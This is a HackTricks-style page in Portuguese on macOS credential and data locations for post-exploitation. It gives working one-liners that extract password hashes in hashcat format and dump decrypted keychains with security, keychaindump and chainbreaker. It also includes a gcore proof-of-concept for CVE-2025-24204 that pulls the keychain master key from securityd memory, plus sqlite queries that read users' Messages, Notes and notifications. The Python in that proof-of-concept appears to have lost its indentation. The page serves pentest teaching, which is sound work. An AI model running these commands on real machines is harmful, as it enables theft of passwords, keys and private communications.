# macOS Locais Sensíveis e Daemons Interessantes

{{#include ../../../banners/hacktricks-training.md}}

## Senhas

### Shadow Passwords

A shadow password é armazenada junto com a configuração do usuário em plists localizados em **`/var/db/dslocal/nodes/Default/users/`**.\
O seguinte oneliner pode ser usado para extrair **todas as informações sobre os usuários** (incluindo informações de hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) podem ser usados para transformar o hash para **hashcat** **formato**.

Um one-liner alternativo que irá extrair as credenciais de todas as contas que não são de serviço no formato hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Outra forma de obter o `ShadowHashData` de um utilizador é usando o `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Este ficheiro é **usado apenas** quando o sistema está a correr em **modo de utilizador único** (portanto não com muita frequência).

### Keychain Dump

Tenha em atenção que, ao usar o binário security para **dump the passwords decrypted**, vários prompts irão pedir ao utilizador para permitir esta operação.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Com base neste comentário [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) parece que essas ferramentas não estão mais funcionando no Big Sur.

### Visão geral do Keychaindump

Uma ferramenta chamada **keychaindump** foi desenvolvida para extrair senhas dos keychains do macOS, mas enfrenta limitações em versões mais recentes do macOS como o Big Sur, conforme indicado em uma [discussão](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). O uso de **keychaindump** requer que o atacante obtenha acesso e eleve privilégios para **root**. A ferramenta explora o fato de que o keychain é desbloqueado por padrão ao efetuar login no usuário, por conveniência, permitindo que aplicações o acessem sem exigir repetidamente a senha do usuário. Entretanto, se o usuário optar por bloquear seu keychain após cada uso, **keychaindump** torna-se ineficaz.

**Keychaindump** opera direcionando-se a um processo específico chamado **securityd**, descrito pela Apple como um daemon para autorização e operações criptográficas, crucial para acessar o keychain. O processo de extração envolve identificar uma **Master Key** derivada da senha de login do usuário. Essa chave é essencial para ler o arquivo do keychain. Para localizar a **Master Key**, **keychaindump** escaneia o heap de memória do **securityd** usando o comando `vmmap`, procurando por chaves potenciais em áreas marcadas como `MALLOC_TINY`. O seguinte comando é usado para inspecionar essas localizações de memória:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Após identificar possíveis master keys, o **keychaindump** procura nas heaps por um padrão específico (`0x0000000000000018`) que indica um candidato a master key. Passos adicionais, incluindo desofuscação, são necessários para utilizar essa chave, conforme descrito no código-fonte do **keychaindump**. Analistas focados nessa área devem observar que os dados cruciais para descriptografar o keychain estão armazenados na memória do processo **securityd**. Um comando de exemplo para executar o **keychaindump** é:
```bash
sudo ./keychaindump
```
[**Chainbreaker**](https://github.com/n0fate/chainbreaker) pode ser usado para extrair os seguintes tipos de informação de um Keychain do OSX de maneira forense:

- Senha do Keychain hasheada, adequada para cracking com [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
- Senhas de Internet
- Senhas Genéricas
- Chaves Privadas
- Chaves Públicas
- Certificados X509
- Notas Seguras
- Senhas do Appleshare

Dada a senha de desbloqueio do Keychain, uma master key obtida usando [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou um arquivo de desbloqueio como SystemKey, Chainbreaker também fornecerá senhas em texto claro.

Sem um desses métodos para desbloquear o Keychain, Chainbreaker exibirá todas as outras informações disponíveis.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain keys (com senhas) com SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Extrair chaves do keychain (com senhas) quebrando o hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump chaves do Keychain (com senhas) with memory dump**

[Siga estes passos](../index.html#dumping-memory-with-osxpmem) para realizar um **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (com senhas) usando a senha do usuário**

Se você conhece a senha do usuário, pode usá-la para **dump and decrypt keychains que pertencem ao usuário**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Chave mestra do Keychain via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) distribuiu `/usr/bin/gcore` com o entitlement **`com.apple.system-task-ports.read`**, então qualquer administrador local (ou app assinado malicioso) poderia dump **qualquer memória de processo mesmo com SIP/TCC aplicados**. Dumping `securityd` leaks a **Keychain master key** in clear e permite decryptar `login.keychain-db` sem a senha do usuário.

**Quick repro on vulnerable builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Alimente a chave hex extraída no Chainbreaker (`--key <hex>`) para descriptografar o login keychain. A Apple removeu a entitlement em **macOS 15.3+**, então isso só funciona em builds Sequoia não corrigidas ou em sistemas que mantiveram o binário vulnerável.

### kcpassword

O arquivo **kcpassword** é um arquivo que contém a **senha de login do usuário**, mas apenas se o proprietário do sistema tiver **ativado o login automático**. Portanto, o usuário será conectado automaticamente sem ser solicitado a fornecer uma senha (o que não é muito seguro).

A senha é armazenada no arquivo **`/etc/kcpassword`** xored com a chave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se a senha do usuário for mais longa que a chave, a chave será reutilizada.\
Isso torna a senha bastante fácil de recuperar, por exemplo usando scripts como [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informações Interessantes em Bancos de Dados

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notificações

Você pode encontrar os dados de Notificações em `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

A maior parte das informações interessantes estará em **blob**. Então você precisará **extrair** esse conteúdo e **transformá-lo** em um **formato** **legível** ou usar **`strings`**. Para acessá-lo você pode fazer:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Problemas recentes de privacidade (NotificationCenter DB)

- Em macOS **14.7–15.1** a Apple armazenou o conteúdo dos banners no `db2/db` SQLite sem mascaramento adequado. Os CVEs **CVE-2024-44292/44293/40838/54504** permitiram que qualquer usuário local lesse o texto das notificações de outros usuários apenas abrindo o DB (sem prompt do TCC). Corrigido no **15.2** movendo/trancando o DB; em sistemas mais antigos o caminho acima ainda leaks notificações recentes e anexos.
- O banco de dados é legível por todos apenas nas builds afetadas, então quando hunting on legacy endpoints copie-o antes de atualizar para preservar artefatos.

### Notas

As **notes** dos usuários podem ser encontradas em `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Preferências

No macOS, as preferências dos apps estão localizadas em **`$HOME/Library/Preferences`** e no iOS estão em `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

No macOS, a ferramenta de linha de comando **`defaults`** pode ser usada para **modificar o arquivo de Preferences**.

**`/usr/sbin/cfprefsd`** reivindica os serviços XPC `com.apple.cfprefsd.daemon` and `com.apple.cfprefsd.agent` e pode ser chamado para executar ações como modificar preferências.

## OpenDirectory permissions.plist

O arquivo `/System/Library/OpenDirectory/permissions.plist` contém permissões aplicadas aos atributos do node e é protegido pelo SIP.\
Este arquivo concede permissões a usuários específicos por UUID (e não por uid) de modo que eles podem acessar informações sensíveis específicas como `ShadowHashData`, `HeimdalSRPKey` and `KerberosKeys` entre outros:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notificações do Sistema

### Notificações do Darwin

O daemon principal para notificações é **`/usr/sbin/notifyd`**. Para receber notificações, os clientes devem registrar-se através da `com.apple.system.notification_center` Mach port (verifique-os com `sudo lsmp -p <pid notifyd>`). O daemon é configurável com o arquivo `/etc/notify.conf`.

Os nomes usados para notificações são notações DNS reversa únicas e, quando uma notificação é enviada para um desses nomes, o(s) cliente(s) que indicaram que podem tratá-la a receberão.

É possível obter o status atual (e ver todos os nomes) enviando o sinal SIGUSR2 para o processo notifyd e lendo o arquivo gerado: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

The **Distributed Notification Center** whose main binary is **`/usr/sbin/distnoted`**, é outra forma de enviar notificações. Ele expõe alguns serviços XPC e realiza algumas verificações para tentar validar os clientes.

### Apple Push Notifications (APN)

Neste caso, aplicações podem registrar-se para **topics**. O cliente gerará um token ao contatar os servidores da Apple através de **`apsd`**.\
Então, os providers também terão gerado um token e poderão conectar-se aos servidores da Apple para enviar mensagens aos clientes. Essas mensagens serão recebidas localmente pelo **`apsd`**, que encaminhará a notificação para a aplicação que a aguarda.

As preferências estão localizadas em `/Library/Preferences/com.apple.apsd.plist`.

Há um banco de dados local de mensagens localizado no macOS em `/Library/Application\ Support/ApplePushService/aps.db` e no iOS em `/var/mobile/Library/ApplePushService`. Ele possui 3 tabelas: `incoming_messages`, `outgoing_messages` e `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Também é possível obter informações sobre o daemon e as conexões usando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notificações do Usuário

Estas são notificações que o usuário deve ver na tela:

- **`CFUserNotification`**: Esta API fornece uma forma de exibir na tela um pop-up com uma mensagem.
- **The Bulletin Board**: No iOS, isso exibe um banner que desaparece e será armazenado no Notification Center.
- **`NSUserNotificationCenter`**: Este é o iOS bulletin board no MacOS. O banco de dados com as notificações está localizado em `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Referências

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
